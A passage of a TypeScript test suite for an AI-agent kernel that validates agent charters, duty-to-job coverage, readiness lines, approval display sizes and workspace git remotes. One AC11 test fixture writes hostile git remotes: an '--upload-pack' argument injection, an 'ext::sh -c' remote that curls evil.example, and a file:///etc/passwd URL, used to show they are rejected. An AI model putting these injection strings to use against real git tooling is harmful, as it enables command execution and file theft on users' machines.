    expect(validateCharter(crew(["A bare line, as the owner writes it."], []), { dataDir }).ok).toBe(true);
  });

  it("Wright's create refuses a bare-string duty (invalid_input, telling Wright to name its jobs); the owner's create keeps it", async () => {
    const h = await boot();
    const c = crew(["Turn tickets into PRs"], ["automate_tickets"]);
    const d = await h.create(c);
    expect(d.permissionDecisionReason).toBe(`kernel_agent_create: invalid_input: ${wrightDutyRefusal(validated(c))} (nothing was held for the owner)`);
    expect(d.permissionDecisionReason).toContain('duties.0: write each duty as {"text": "<the duty>", "jobs": [<the catalogue job ids that do it>]}');
    expect(h.approvals()).toBe(0);
    h.ownerCreate(c);
    expect(getAgent(h.store, "dev")).toBeDefined();
  });
});

// ---- AC10: a check that cannot run ----------------------------------------------------------

describe("AC10: a check that cannot run says which and why, never ready", () => {
  it.skipIf(!NO_ROOT)("a workspace whose git config can't be read: the repo line is not checked, and the read reports unreadable, never not a checkout", async () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    const h = await boot();
    h.ownerCreate(crew([duty("Ask for merges", "ask_for_merge")], ["ask_for_merge"], { workspaces: [ws] }));
    h.setConnectors("dev", { github: "write" });
    lock(join(ws, ".git", "config"));
    expect(readWorkspaceRepos(ws)).toEqual({ kind: "unreadable", detail: "its git config can't be read (EACCES)" });
    // The run-time reader keeps its answer: no repo, never a throw.
    expect(remoteRepos(ws)).toEqual([]);
    const held = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(readinessLines(h.display())).toContain(
      `  not checked: copy of a repo for Ask for a merge: can't tell whether it has one (${ws}: its git config can't be read (EACCES))`,
    );
    expect(held.permissionDecisionReason).toContain("Ask the owner to check that the kernel can read the workspace named above.");
  });

  it.skipIf(!NO_ROOT)("a workspace folder that can't be searched is unreadable too", () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    lock(ws);
    expect(readWorkspaceRepos(ws)).toEqual({ kind: "unreadable", detail: "its .git can't be read (EACCES)" });
    const r = readiness(crew([duty("Ask for merges", "ask_for_merge")], ["ask_for_merge"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.items.find((i) => i.subject === "workspace")?.status).toBe("not_checked");
  });

  it("a definite answer is not 'unreadable': a missing folder, a folder with no .git, a .git with no config", () => {
    const empty = join(tmp, "work", "empty");
    mkdirSync(empty, { recursive: true });
    const noConfig = join(tmp, "work", "noconfig");
    mkdirSync(join(noConfig, ".git"), { recursive: true });
    expect(readWorkspaceRepos(join(tmp, "nope"))).toEqual({ kind: "not_checkout", detail: "the folder does not exist" });
    expect(readWorkspaceRepos(empty)).toEqual({ kind: "not_checkout", detail: "it is not a git checkout" });
    expect(readWorkspaceRepos(noConfig)).toEqual({ kind: "not_checkout", detail: "it has no git config" });
  });

  it("the member's connectors grant can't be read: its lines are not checked, never ready", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read PRs", "read_pr")], ["read_pr"]));
    h.setConnectors("dev", 5);
    await h.update("dev", { limits: { tokens_per_day: 100000 } });
    const line = readinessLines(h.display()).find((l) => l.includes("GitHub access"));
    expect(line?.startsWith("  not checked: GitHub access for Read a PR: not checked (the member's connectors grant can't be read: ")).toBe(true);
    const unit = readiness(crew([duty("Read PRs", "read_pr")], ["read_pr"]), { kind: "unread", reason: "the settings file can't be read (EACCES)" }, "update");
    expect(unit.lines).toContain("  not checked: GitHub access for Read a PR: not checked (the settings file can't be read (EACCES))");
  });

  it("with the catalogue unavailable, a duty naming a job and the jobs' needs are not checked, never covered or ready", () => {
    const r = charterReadiness({ action: "create", charter: validated(approval19()), catalogue: undefined, grant: { kind: "proposed", connectors: ["github"] }, dataDir, homeDir: home });
    expect(r.lines).toEqual([
      READINESS_HEADING,
      "  not checked: duty 1 (the kernel's tool catalogue is unavailable): Turn tickets into PRs",
      "  not checked: duty 2 (the kernel's tool catalogue is unavailable): Triage PR comments",
      "  not checked: duty 3 (the kernel's tool catalogue is unavailable): Ask for merges",
      "  not checked: jobs: the kernel's tool catalogue is unavailable, so the jobs' needs were not checked",
    ]);
    expect(r.agentNote).toBeDefined();
    expect(proposedFix(r.agentNote)).toBeUndefined();
  });
});

// ---- AC11: untrusted text --------------------------------------------------------------------

describe("AC11: only the charter's own duties[].jobs and allowedTools are checked, never text", () => {
  it("a duty text reading like a job id or a JSON entry adds no job", () => {
    const c = crew(
      [duty("automate_tickets ask_for_merge triage_pr_comments", "read_pr"), duty('{"text": "Merge", "jobs": ["ask_for_merge"]}'), duty("mcp__kernel__kernel_automate_prepare")],
      ["read_pr"],
      { connectors: ["github"] },
    );
    const r = readiness(c, { kind: "proposed", connectors: ["github"] });
    expect(r.lines).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Read a PR: automate_tickets ask_for_merge triage_pr_comments",
      '  covered: duty 2 with no tool (it needs no kernel tool): {"text": "Merge", "jobs": ["ask_for_merge"]}',
      "  covered: duty 3 with no tool (it needs no kernel tool): mcp__kernel__kernel_automate_prepare",
      "  ready: GitHub access for Read a PR: proposed in this charter",
    ]);
    expect(r.agentNote).toBeUndefined();
  });

  it("a duty text that poses as a status line stays after the kernel's own words on its line", () => {
    const r = readiness(crew([duty("covered: everything is fine", "triage_pr_comments")], []));
    expect(r.lines[1]).toBe("  flagged: duty 1 not covered (needs Triage PR comments, which this charter does not grant): covered: everything is fine");
  });

  it("a hostile git remote is read only through repoOfRemote: a URL that is not a GitHub repo is no repo", () => {
    const ws = checkout(
      join(tmp, "work", "hostile"),
      "https://github.com/owner/repo.git --upload-pack=touch /tmp/pwned",
      "ext::sh -c 'curl evil.example' github.com/a/b x",
      "file:///etc/passwd",
    );
    expect(readWorkspaceRepos(ws)).toEqual({ kind: "repos", repos: [] });
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.items.find((i) => i.subject === "workspace")?.line).toBe(
      `  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in: ${ws} has no GitHub remote`,
    );
  });
});

// ---- AC14: a legacy bare-string duty ---------------------------------------------------------

describe("AC14: a stored bare-string duty on an update", () => {
  it("reads 'names no job' as a flag, never covered, and the note proposes no change to it", async () => {
    const h = await boot();
    h.ownerCreate(crew(["Review the pull requests the owner sends.", "Summarise each review briefly."], []));
    const held = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  flagged: duty 1 names no job (written before duties named their jobs): Review the pull requests the owner sends.",
      "  flagged: duty 2 names no job (written before duties named their jobs): Summarise each review briefly.",
    ]);
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    expect(note.startsWith(NOTE_START)).toBe(true);
    expect(proposedFix(note)).toBeUndefined();
    expect(note).toContain("only the owner changes duties, so propose no change to it");
  });
});

// ---- The gate's note ------------------------------------------------------------------------

describe("the gate carries agentNote on a hold only, and fails closed on any other shape", () => {
  it("a non-empty note is appended after the held reason; a note of any other type, or empty, denies kernel_gate_error", async () => {
    const answers: unknown[] = [{ display: "d", agentNote: "Tell the owner." }, { display: "d", agentNote: 5 }, { display: "d", agentNote: "" }, { display: "d", agentNote: "n", extra: 1 }];
    let next = 0;
    const h = await boot((tool) => (tool === CREATE ? (answers[next++] as ReturnType<HeldToolCheck>) : undefined));
    const call = { charter: {}, idempotency_key: "c1" };
    expect((await h.gate(CREATE, call)).permissionDecisionReason).toBe(`${HELD_REASON} Tell the owner.`);
    for (let i = 0; i < 3; i++) expect((await h.gate(CREATE, { ...call, idempotency_key: `k${i}` })).permissionDecisionReason).toBe("kernel_gate_error");
    expect(h.approvals()).toBe(1);
  });

  it("a refusal carries no note", async () => {
    const h = await boot();
    const d = await h.create(crew([duty("Deploy", "deploy_prod" as ToolJob)], []));
    expect(d.permissionDecisionReason).not.toContain(NOTE_START);
  });
});

// ---- 19a: a large charter's readiness lines quote a short excerpt of each duty ---------------

/** The jobs approval 21's charter grants (18d Validation 2): Hand tickets to /automate, Ask the owner to approve an action, Notify the owner. */
const APPROVAL21_JOBS: readonly ToolJob[] = ["automate_tickets", "ask_for_approval", "notify_owner"];

/** Approval 21's ten duties, each about 200 characters (approval 21's readiness lines took 3,211 of its head's 3,994), every one covered by a granted job or needing no kernel tool. */
const LONG_DUTIES = [
  duty("Pick up each ticket the owner assigns in the sandbox repo, read its description and comments, and hand it to /automate with a short summary of what done looks like and which files will change, and link the ticket in the thread.", "automate_tickets"),
  duty("Before handing a ticket over, check that the copy of the repo is on main and clean, pull the latest changes, and say so in the thread if anything is out of date or a branch is left behind from an earlier run.", "automate_tickets"),
  duty("Ask the owner to approve any action that writes outside the workspace, deletes a branch, or changes a CI workflow, and wait for the decision instead of trying a different way around it or asking twice.", "ask_for_approval"),
  duty("Notify the owner when a pull request is opened for a ticket, naming the ticket, the branch and the one-line summary, so the owner can review it from the phone without opening the app or the repo first.", "notify_owner"),
  duty("Keep each pull request small and focused on one ticket; if a ticket turns out to need more than one change, say so in the thread and propose how to split it before writing any code for the second part."),
  duty("Run the repo's own tests and linters before every pull request and report the exact commands and their results in the pull request body, never claiming a check passed without running it on this copy of the repo."),
  duty("Notify the owner when a ticket is blocked for more than a day, naming what it is waiting on (a question, an approval, a failing check) and what you need from the owner to move it forward, once, without repeating it.", "notify_owner"),
  duty("Write the pull request description in plain words: what changed, why, how it was tested, and what the reviewer should look at first, with links to the ticket and any related pull requests or earlier tickets."),
  duty("Ask the owner before adding a new dependency, upgrading a major version, or changing the build configuration, and explain the reason, the risk and the smallest alternative you considered and rejected.", "ask_for_approval"),
  duty("At the end of each day, write a short note in lessons.md about anything that surprised you in the repo, so the next session starts from what you learned instead of finding it out again the hard way."),
];

/** Approval 21's tool policy: the file and shell tools, every tool of `jobs`, its Bash prefixes and its never list. */
function approval21Policy(jobs: readonly ToolJob[] = APPROVAL21_JOBS): Record<string, unknown> {
  return {
    allowedTools: ["Read", "Write", "Edit", "Glob", "Grep", "Bash", ...jobs.flatMap(toolsOf)],
    allowedBashPrefixes: ["git status", "git diff", "git log", "git checkout -b", "npm test", "npm run lint", "npm run typecheck"],
    never: ["git_push", "gh_pr_create", "gh_pr_edit", "gh_pr_close", "gh_pr_comment", "gh_issue_create"],
  };
}

/** Approval 21's shape (18d Validation 2): ten ~200-character duties, the same granted jobs, a GitHub proposal and no workspace. */
function approval21(extra: Record<string, unknown> = {}): Record<string, unknown> {
  return crew([...LONG_DUTIES], APPROVAL21_JOBS, {
    id: "studio-sandbox-developer",
    display_name: "Sandbox Developer",
    avatar: { shape: "octopus", hue: "crew-olive" },
    persona: "A developer that turns the owner's tickets into pull requests in the sandbox repo.",
    tool_policy: approval21Policy(),
    limits: { tokens_per_day: 2000000, sessions_at_once: 1, delegation_depth: 1 },
    connectors: ["github"],
    ...extra,
  });
}

const A21 = "studio-sandbox-developer";

/** A create display's head: every line before the settings file (what must fit `MAX_APPROVAL_DISPLAY`). */
function headOf(display: string, id = A21): string {
  const at = display.indexOf(`\nconfig/agents/${id}.json:\n`);
  if (at < 0) throw new Error("not a create display");
  return display.slice(0, at);
}

/** Approval 21's ten duties' excerpts: each its leading words that fit READINESS_DUTY_EXCERPT_MAX with the mark, cut at a space. */
const A21_EXCERPTS = [
  "Pick up each ticket the owner assigns in the sandbox repo, read its…",
  "Before handing a ticket over, check that the copy of the repo is on…",
  "Ask the owner to approve any action that writes outside the workspace,…",
  "Notify the owner when a pull request is opened for a ticket, naming the…",
  "Keep each pull request small and focused on one ticket; if a ticket…",
  "Run the repo's own tests and linters before every pull request and…",
  "Notify the owner when a ticket is blocked for more than a day, naming…",
  "Write the pull request description in plain words: what changed, why,…",
  "Ask the owner before adding a new dependency, upgrading a major…",
  "At the end of each day, write a short note in lessons.md about anything…",
];

/** `head` as the kernel showed it before 19a: each duty quoted whole, and the job lines in their shortest (label-only) form. */
function wholeDutyHead(head: string): string {
  let whole = head
    .split("\n")
    .filter((l) => !l.startsWith("  - "))
    .join("\n");
  LONG_DUTIES.forEach((d, i) => {
    whole = whole.replace(A21_EXCERPTS[i] as string, d.text);
  });
  return whole;
}

/** Approval 21's ten duty lines, exactly as the kernel quotes them (each duty's number, how it is covered, its excerpt). */
const A21_DUTY_LINES = [
  "  covered: duty 1 by Hand tickets to /automate: Pick up each ticket the owner assigns in the sandbox repo, read its…",
  "  covered: duty 2 by Hand tickets to /automate: Before handing a ticket over, check that the copy of the repo is on…",
  "  covered: duty 3 by Ask the owner to approve an action: Ask the owner to approve any action that writes outside the workspace,…",
  "  covered: duty 4 by Notify the owner: Notify the owner when a pull request is opened for a ticket, naming the…",
  "  covered: duty 5 with no tool (it needs no kernel tool): Keep each pull request small and focused on one ticket; if a ticket…",
  "  covered: duty 6 with no tool (it needs no kernel tool): Run the repo's own tests and linters before every pull request and…",
  "  covered: duty 7 by Notify the owner: Notify the owner when a ticket is blocked for more than a day, naming…",
  "  covered: duty 8 with no tool (it needs no kernel tool): Write the pull request description in plain words: what changed, why,…",
  "  covered: duty 9 by Ask the owner to approve an action: Ask the owner before adding a new dependency, upgrading a major…",
  "  covered: duty 10 with no tool (it needs no kernel tool): At the end of each day, write a short note in lessons.md about anything…",
];

describe("19a: a readiness duty line quotes a word-bounded excerpt of the duty, so a large charter still gets a new version", () => {
  it("AC5: a text of at most READINESS_DUTY_EXCERPT_MAX characters is quoted whole; a longer one ends at a space with exactly one …, never mid-word", () => {
    expect(READINESS_DUTY_EXCERPT_MAX).toBe(72);
    // Whole, with no cut mark: a short text, and one of exactly the limit.
    expect(dutyExcerpt("Turn tickets into PRs")).toBe("Turn tickets into PRs");
    const atLimit = `${"word ".repeat(14)}ab`;
    expect(atLimit).toHaveLength(READINESS_DUTY_EXCERPT_MAX);
    expect(dutyExcerpt(atLimit)).toBe(atLimit);
    // One character over: the last word that leaves room for the mark, then the mark.
    expect(dutyExcerpt(`${atLimit}c`)).toBe(`${"word ".repeat(13)}word…`);
    // A word ending exactly where the mark would go is kept whole.
    expect(dutyExcerpt(`${"abcd ".repeat(14)}a ${"z".repeat(20)}`)).toBe(`${"abcd ".repeat(14)}a…`);
    // Whitespace runs are one space before the length is counted.
    expect(dutyExcerpt("  Turn\n tickets\t into   PRs ")).toBe("Turn tickets into PRs");
    // A first word longer than the excerpt is the one case cut inside a word, still with one mark, never half a surrogate pair.
    expect(dutyExcerpt("a".repeat(100))).toBe(`${"a".repeat(71)}…`);
    expect(dutyExcerpt(`${"a".repeat(70)}😀${"b".repeat(10)}`)).toBe(`${"a".repeat(70)}…`);
    // Every long duty: at most the limit, one mark at the end, a prefix of the text that ends where a word ends.
    for (const { text } of LONG_DUTIES) {
      const excerpt = dutyExcerpt(text);
      expect(excerpt.length).toBeLessThanOrEqual(READINESS_DUTY_EXCERPT_MAX);
      expect(excerpt.endsWith("…")).toBe(true);
      expect(excerpt.split("…")).toHaveLength(2);
      const words = excerpt.slice(0, -1);
      expect(text.startsWith(words)).toBe(true);
      expect(text[words.length]).toBe(" ");
      expect(words.endsWith(" ")).toBe(false);
    }
  });

  it("AC1 and AC6: approval 21's 10-duty charter is held; each duty line names its number and quotes its excerpt, the head fits with at least 1,200 characters to spare, and role.md keeps every duty's full text", async () => {
    const lengths = LONG_DUTIES.map((d) => d.text.length);
    expect(lengths.reduce((a, b) => a + b, 0) / lengths.length).toBeGreaterThanOrEqual(180);
    expect(Math.min(...lengths)).toBeGreaterThan(READINESS_DUTY_EXCERPT_MAX);
    const h = await boot();
    expect((await h.create(approval21())).permissionDecisionReason.startsWith("approval_required: held as approval 1;")).toBe(true);
    const display = h.display();
    const head = headOf(display);
    expect(readinessLines(display)).toEqual([
      READINESS_HEADING,
      ...A21_DUTY_LINES,
      "  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in (no workspace is listed)",
      "  flagged: GitHub write access for Hand tickets to /automate: only you can grant it (Team, in the member's inspector)",
    ]);
    expect(MAX_APPROVAL_DISPLAY - head.length).toBeGreaterThanOrEqual(1200);
    // AC6: the head quotes no duty whole; role.md, in the stored display, has every duty's full text.
    const roleMd = display.slice(display.indexOf(`\nmemory/${A21}/role.md:\n`));
    expect(display.endsWith(renderRoleMd(validated(approval21()), ["github"]).trimEnd())).toBe(true);
    for (const { text } of LONG_DUTIES) {
      expect(head).not.toContain(text);
      expect(roleMd).toContain(text);
    }
  });

  it("AC5: the excerpts are exactly each duty's leading words (the duty number keeps two alike apart)", () => {
    expect(LONG_DUTIES.map((d) => dutyExcerpt(d.text))).toEqual(A21_EXCERPTS);
  });

  it("AC2: the owner's Ask or change adds comment replies (Triage PR comments and the Read a PR it needs, 8 more kernel tools); Wright's redraft (a new key, the same id) is held as v2 and withdraws v1", async () => {
    const h = await boot();
    expect((await h.create(approval21(), "c1")).permissionDecisionReason.startsWith("approval_required: held as approval 1;")).toBe(true);
    const more: ToolJob[] = ["triage_pr_comments", "read_pr"];
    expect(more.flatMap(toolsOf).length).toBeGreaterThanOrEqual(5);
    const v2 = await h.create(approval21({ tool_policy: approval21Policy([...APPROVAL21_JOBS, ...more]) }), "c2");
    expect(v2.permissionDecisionReason.startsWith("approval_required: held as approval 2;")).toBe(true);
    expect(events(h.store, "approval_decided").map((e) => e.payload)).toEqual([{ id: 1, decision: "deny", by: "kernel", action: AGENT_CREATE_TOOL_NAME, replaced_by: 2 }]);
    const display = h.display(2);
    expect(headOf(display).length).toBeLessThanOrEqual(MAX_APPROVAL_DISPLAY);
    expect(readinessLines(display).slice(1, 11)).toEqual(A21_DUTY_LINES);
    for (const tool of more.flatMap(toolsOf)) expect(headOf(display)).toContain(tool);
    // Before 19a (each duty quoted whole) this redraft was refused for size, as approval 21's was.
    expect(wholeDutyHead(headOf(display)).length).toBeGreaterThan(MAX_APPROVAL_DISPLAY);
  });

  it("AC3: Choose workspace: Wright's redraft naming the saved workspace (a path longer than ~/studio-work/studio-sandbox under a home dir) is held as v2, and with comment replies too as v3", async () => {
    const ws = checkout(join(home, "studio-work", "studio-sandbox"), "git@github.com:owner/studio-sandbox.git");
    expect(ws.length).toBeGreaterThanOrEqual(join("/Users/owner", "studio-work", "studio-sandbox").length);
    const h = await boot();
    await h.create(approval21(), "c1");
    expect((await h.create(approval21({ workspaces: [ws] }), "c2")).permissionDecisionReason.startsWith("approval_required: held as approval 2;")).toBe(true);
    const v2 = h.display(2);
    expect(headOf(v2).length).toBeLessThanOrEqual(MAX_APPROVAL_DISPLAY);
    expect(readinessLines(v2)).toContain(`  ready: copy of a repo for Hand tickets to /automate: works in owner/studio-sandbox at ${ws}`);
    expect(headOf(v2).split("\n").at(-1)).toBe(`workspaces: ${ws}`);
    const both = approval21({ workspaces: [ws], tool_policy: approval21Policy([...APPROVAL21_JOBS, "triage_pr_comments", "read_pr"]) });
    expect((await h.create(both, "c3")).permissionDecisionReason.startsWith("approval_required: held as approval 3;")).toBe(true);
    expect(headOf(h.display(3)).length).toBeLessThanOrEqual(MAX_APPROVAL_DISPLAY);
    // Before 19a (each duty quoted whole) this v3 was refused for size, as approval 21's workspace redraft was.
    expect(wholeDutyHead(headOf(h.display(3))).length).toBeGreaterThan(MAX_APPROVAL_DISPLAY);
    expect(events(h.store, "approval_decided").map((e) => [e.payload.id, e.payload.replaced_by])).toEqual([
      [1, 2],
      [2, 3],
    ]);
  });

  it("AC4: a held update of a 10-duty member quotes the same excerpts and fits under the same conditions as the create (the comment-reply tools, the saved workspace)", async () => {
    const ws = checkout(join(home, "studio-work", "studio-sandbox"), "git@github.com:owner/studio-sandbox.git");
    const h = await boot();
    h.ownerCreate(approval21());
    const policy = approval21Policy([...APPROVAL21_JOBS, "triage_pr_comments", "read_pr"]);
    const tools = await h.update(A21, { tool_policy: { allowedTools: policy.allowedTools, allowedBashPrefixes: policy.allowedBashPrefixes } }, "u1");
    expect(tools.permissionDecisionReason.startsWith("approval_required: held as approval 1;")).toBe(true);
    const display = h.display(1);
    expect(display.length).toBeLessThanOrEqual(MAX_APPROVAL_DISPLAY);
    expect(readinessLines(display).slice(0, 11)).toEqual([READINESS_HEADING, ...A21_DUTY_LINES]);
    expect((await h.update(A21, { workspaces: [ws] }, "u2")).permissionDecisionReason.startsWith("approval_required: held as approval 2;")).toBe(true);
    expect(h.display(2).length).toBeLessThanOrEqual(MAX_APPROVAL_DISPLAY);
    expect(readinessLines(h.display(2)).slice(1, 11)).toEqual(A21_DUTY_LINES);
  });

  it("AC4: the update's floor quotes the same excerpts: on a 10-duty member a tool_policy request over the cut is asked for less (never 'no request to these fields fits'), and a smaller one is held", async () => {
    const h = await boot();
    const wide = (n: number, tag: string) => Array.from({ length: n }, (_, i) => `mcp__wide__${tag.repeat(135)}_${String(i).padStart(2, "0")}`);
    // Every duty names a job, so each duty line in the floor is at its shortest form (covered or not covered, with the excerpt).
    const duties = LONG_DUTIES.map((d) => (d.jobs.length > 0 ? d : duty(d.text, "notify_owner")));
    const base = approval21Policy();
    const held = [...(base.allowedTools as string[]), ...wide(8, "a")];
    h.ownerCreate(approval21({ duties, tool_policy: { ...base, allowedTools: held } }));
    // Over the cut in every form (8 more long tools), but a request to tool_policy with shorter values fits: Wright's to shrink.
    const over = await h.update(A21, { tool_policy: { allowedTools: [...held, ...wide(8, "b")], allowedBashPrefixes: base.allowedBashPrefixes } }, "u1");
    expect(over.permissionDecision).toBe("deny");
    expect(over.permissionDecisionReason).toMatch(
      /^kernel_agent_update: invalid_input: the display \(its readiness lines, job lines, field lines and enforced line\) would be \d+ characters, \d+ over the 4000 the owner is shown; ask for less at once \(fewer or shorter tools, prefixes or workspaces\) \(nothing was held for the owner\)$/,
    );
    expect(over.permissionDecisionReason).not.toContain("no request to these fields fits");
    expect(h.approvals()).toBe(0);
    // Dropping the long tools: held, with the same excerpts.
    const fits = await h.update(A21, { tool_policy: { allowedTools: base.allowedTools, allowedBashPrefixes: base.allowedBashPrefixes } }, "u2");
    expect(fits.permissionDecisionReason.startsWith("approval_required: held as approval 1;")).toBe(true);
    expect(h.display(1).length).toBeLessThanOrEqual(MAX_APPROVAL_DISPLAY);
  });

  it("AC5: a stored bare-string duty (an update's legacy line) is quoted by its excerpt too", async () => {
    const h = await boot();
    h.ownerCreate(crew(LONG_DUTIES.map((d) => d.text), []));
    expect((await h.update("dev", { limits: { tokens_per_day: 100000 } })).permissionDecisionReason.startsWith("approval_required: held as approval 1;")).toBe(true);
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      ...A21_EXCERPTS.map((e, i) => `  flagged: duty ${i + 1} names no job (written before duties named their jobs): ${e}`),
    ]);
  });
});
